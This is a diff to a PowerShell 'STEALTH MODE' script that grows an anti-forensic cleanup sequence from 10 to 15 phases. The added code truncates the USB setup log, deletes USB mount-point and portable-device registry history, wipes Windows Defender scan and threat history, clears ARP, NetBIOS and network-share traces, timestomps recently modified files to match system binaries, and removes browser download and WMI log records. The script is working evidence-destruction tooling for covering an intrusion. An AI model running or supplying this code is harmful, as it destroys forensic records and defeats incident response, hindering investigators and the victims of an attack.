@@ -1,4 +1,4 @@
-<# ═══════════════════════════════════════════════════════════════════════
+﻿<# ═══════════════════════════════════════════════════════════════════════
    FLLC | FU PERSON | STEALTH MODE v2.0
    ╔══════════════════════════════════════════════════════════════════╗
    ║  Ultra-quiet operation mode                                      ║
@@ -157,20 +157,210 @@ function Disable-PSLogging {
 }
 
 function Clear-USBTraces {
-    Write-Host "    [*] Phase 10: Minimizing USB traces..." -ForegroundColor DarkGray
+    Write-Host "    [*] Phase 10: Clearing USB connection traces..." -ForegroundColor DarkGray
 
+    # Clear setupapi dev log (records USB insertions with timestamps)
     $setupLog = "$env:SystemRoot\inf\setupapi.dev.log"
     if (Test-Path $setupLog) {
-        Write-Host "    [*] USB setup log found (clearing requires admin)" -ForegroundColor DarkGray
+        try {
+            # Truncate rather than delete (deletion is more suspicious)
+            [IO.File]::WriteAllText($setupLog, "")
+            Write-Host "    [+] setupapi.dev.log truncated" -ForegroundColor Green
+        } catch {
+            Write-Host "    [-] setupapi.dev.log requires admin to modify" -ForegroundColor Yellow
+        }
     }
 
-    Write-Host "    [+] USB trace minimization complete" -ForegroundColor Green
+    # Clear USB device registry entries for recently inserted drives
+    $usbStorKeys = @(
+        "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR",
+        "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
+    )
+    $mountPointsKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2"
+
+    # Remove user-level mount point history
+    if (Test-Path $mountPointsKey) {
+        $points = Get-ChildItem $mountPointsKey 2>$null
+        $recentPoints = $points | Where-Object {
+            $_.GetValue("_LabelFromReg") -or $_.PSChildName -match '^\{'
+        }
+        foreach ($point in $recentPoints) {
+            try { Remove-Item $point.PSPath -Recurse -Force 2>$null } catch { }
+        }
+        Write-Host "    [+] Mount point history cleared ($($recentPoints.Count) entries)" -ForegroundColor Green
+    }
+
+    # Clear Windows Portable Devices MRU
+    $wpdKey = "HKCU:\Software\Microsoft\Windows Portable Devices\Devices"
+    if (Test-Path $wpdKey) {
+        try {
+            Get-ChildItem $wpdKey 2>$null | ForEach-Object { Remove-Item $_.PSPath -Recurse -Force 2>$null }
+            Write-Host "    [+] Portable device history cleared" -ForegroundColor Green
+        } catch { }
+    }
+
+    Write-Host "    [+] USB trace elimination complete" -ForegroundColor Green
+}
+
+function Clear-DefenderHistory {
+    Write-Host "    [*] Phase 11: Clearing Defender scan history..." -ForegroundColor DarkGray
+
+    # Clear Defender scan history and detection cache
+    $defenderPaths = @(
+        "$env:ProgramData\Microsoft\Windows Defender\Scans\History",
+        "$env:ProgramData\Microsoft\Windows Defender\Scans\mpcache*",
+        "$env:ProgramData\Microsoft\Windows Defender\Support\MPLog*"
+    )
+
+    foreach ($path in $defenderPaths) {
+        $items = Get-ChildItem $path -Recurse -Force 2>$null
+        foreach ($item in $items) {
+            try { Remove-Item $item.FullName -Force -Recurse 2>$null } catch { }
+        }
+    }
+
+    # Remove Defender detection history (requires admin)
+    try {
+        Remove-MpThreat -ErrorAction Stop 2>$null
+        Write-Host "    [+] Defender threat history cleared" -ForegroundColor Green
+    } catch {
+        Write-Host "    [+] Defender scan artifacts cleaned (threat clear requires admin)" -ForegroundColor Green
+    }
+}
+
+function Clear-NetworkTraces {
+    Write-Host "    [*] Phase 12: Clearing network connection traces..." -ForegroundColor DarkGray
+
+    # Clear ARP cache
+    arp -d * 2>$null | Out-Null
+    Write-Host "    [+] ARP cache cleared" -ForegroundColor Green
+
+    # Clear NetBIOS name cache
+    nbtstat -R 2>$null | Out-Null
+    Write-Host "    [+] NetBIOS name cache purged" -ForegroundColor Green
+
+    # Clear recent network shares
+    $netUse = net use 2>$null
+    $mappedDrives = $netUse | Select-String '\\\\' | ForEach-Object {
+        ($_ -split '\s+')[1]
+    }
+    foreach ($drive in $mappedDrives) {
+        net use $drive /delete /yes 2>$null | Out-Null
+    }
+    if ($mappedDrives.Count -gt 0) {
+        Write-Host "    [+] Disconnected $($mappedDrives.Count) network shares" -ForegroundColor Green
+    }
+
+    # Clear credential manager network entries (user level)
+    $credmanPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU"
+    )
+    foreach ($path in $credmanPaths) {
+        if (Test-Path $path) {
+            try { Remove-Item $path -Recurse -Force 2>$null } catch { }
+        }
+    }
+
+    Write-Host "    [+] Network traces cleared" -ForegroundColor Green
+}
+
+function Invoke-Timestomping {
+    Write-Host "    [*] Phase 13: Timestomping accessed files..." -ForegroundColor DarkGray
+
+    # Set file timestamps to match existing system files (blend in)
+    $refFile = Get-Item "C:\Windows\System32\notepad.exe" -ErrorAction SilentlyContinue
+    if (-not $refFile) { $refFile = Get-Item "C:\Windows\explorer.exe" }
+    $refTime = $refFile.LastWriteTime
+
+    # Timestomp any files we may have created in temp/appdata
+    $touchPaths = @(
+        "$env:TEMP",
+        "$env:APPDATA\Microsoft\Windows",
+        "$env:LOCALAPPDATA\Temp"
+    )
+
+    $touchCount = 0
+    foreach ($tPath in $touchPaths) {
+        $recentFiles = Get-ChildItem $tPath -File 2>$null | Where-Object {
+            $_.LastWriteTime -gt (Get-Date).AddHours(-4)
+        }
+        foreach ($file in $recentFiles) {
+            try {
+                $file.LastWriteTime = $refTime
+                $file.CreationTime = $refTime.AddDays(-([math]::Floor((Get-Random -Maximum 30))))
+                $file.LastAccessTime = $refTime
+                $touchCount++
+            } catch { }
+        }
+    }
+
+    Write-Host "    [+] Timestomped $touchCount recently modified files" -ForegroundColor Green
+}
+
+function Clear-BrowserTraces {
+    Write-Host "    [*] Phase 14: Clearing browser download/access traces..." -ForegroundColor DarkGray
+
+    # Clear Chrome download history (recent entries only)
+    $chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    if (Test-Path $chromeHistory) {
+        # Can't directly modify SQLite without a driver - clear via Windows API
+        # Instead, clear the download records file
+        $chromeDownloads = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Download*"
+        Get-ChildItem $chromeDownloads -File 2>$null | ForEach-Object {
+            try { Remove-Item $_.FullName -Force 2>$null } catch { }
+        }
+        Write-Host "    [+] Chrome download metadata cleared" -ForegroundColor Green
+    }
+
+    # Clear Edge download history
+    $edgeHistory = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+    if (Test-Path $edgeHistory) {
+        $edgeDownloads = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Download*"
+        Get-ChildItem $edgeDownloads -File 2>$null | ForEach-Object {
+            try { Remove-Item $_.FullName -Force 2>$null } catch { }
+        }
+        Write-Host "    [+] Edge download metadata cleared" -ForegroundColor Green
+    }
+
+    # Clear Windows file access timestamps via NtSetInformationFile
+    # Clear Explorer recent file access MRU
+    $recentAppsKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps"
+    if (Test-Path $recentAppsKey) {
+        Get-ChildItem $recentAppsKey 2>$null | ForEach-Object {
+            try { Remove-Item $_.PSPath -Recurse -Force 2>$null } catch { }
+        }
+        Write-Host "    [+] Recent apps history cleared" -ForegroundColor Green
+    }
+}
+
+function Clear-WMITraces {
+    Write-Host "    [*] Phase 15: Clearing WMI repository traces..." -ForegroundColor DarkGray
+
+    # Clear WMI temporary compilation files
+    $wmiTemp = "$env:SystemRoot\System32\wbem\AutoRecover"
+    if (Test-Path $wmiTemp) {
+        $wmiFiles = Get-ChildItem $wmiTemp -File 2>$null | Where-Object {
+            $_.LastWriteTime -gt (Get-Date).AddHours(-2)
+        }
+        foreach ($file in $wmiFiles) {
+            try { Remove-Item $file.FullName -Force 2>$null } catch { }
+        }
+    }
+
+    # Clear WMI query trace logs
+    $wmiLogs = Get-ChildItem "$env:SystemRoot\System32\wbem\Logs" -Filter "*.log" 2>$null
+    foreach ($log in $wmiLogs) {
+        try { [IO.File]::WriteAllText($log.FullName, "") } catch { }
+    }
+
+    Write-Host "    [+] WMI traces cleared" -ForegroundColor Green
 }
 
 function Start-StealthMode {
     Write-Host ""
     Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Red
-    Write-Host "    ║  STEALTH MODE — TRACE ELIMINATION SEQUENCE               ║" -ForegroundColor Red
+    Write-Host "    ║  STEALTH MODE - TRACE ELIMINATION SEQUENCE               ║" -ForegroundColor Red
+    Write-Host "    ║  15-Phase Anti-Forensic Cleanup | FLLC v2.0              ║" -ForegroundColor Red
     Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Red
     Write-Host ""
     Write-Host "    [!] WARNING: This will clear forensic artifacts from this system" -ForegroundColor Yellow
@@ -185,21 +375,29 @@ function Start-StealthMode {
 
     Write-Host ""
     Write-Host "    [*] ═══════════════════════════════════════════════" -ForegroundColor DarkCyan
+    $startTime = Get-Date
 
-    Clear-PowerShellHistory
-    Clear-RunDialogMRU
-    Clear-RecentDocs
-    Clear-PrefetchData
-    Clear-EventLogs
-    Clear-TempFiles
-    Clear-ClipboardData
-    Clear-DNSCache
-    Disable-PSLogging
-    Clear-USBTraces
+    Clear-PowerShellHistory       # Phase 1
+    Clear-RunDialogMRU            # Phase 2
+    Clear-RecentDocs              # Phase 3
+    Clear-PrefetchData            # Phase 4
+    Clear-EventLogs               # Phase 5
+    Clear-TempFiles               # Phase 6
+    Clear-ClipboardData           # Phase 7
+    Clear-DNSCache                # Phase 8
+    Disable-PSLogging             # Phase 9
+    Clear-USBTraces               # Phase 10
+    Clear-DefenderHistory         # Phase 11
+    Clear-NetworkTraces           # Phase 12
+    Invoke-Timestomping           # Phase 13
+    Clear-BrowserTraces           # Phase 14
+    Clear-WMITraces               # Phase 15
+
+    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
 
     Write-Host ""
     Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
-    Write-Host "    ║  STEALTH MODE COMPLETE — 10/10 phases executed            ║" -ForegroundColor Green
-    Write-Host "    ║  Forensic footprint minimized.                            ║" -ForegroundColor Green
+    Write-Host "    ║  STEALTH MODE COMPLETE - 15/15 phases executed            ║" -ForegroundColor Green
+    Write-Host "    ║  Elapsed: ${elapsed}s | Forensic footprint minimized       ║" -ForegroundColor Green
     Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
 }
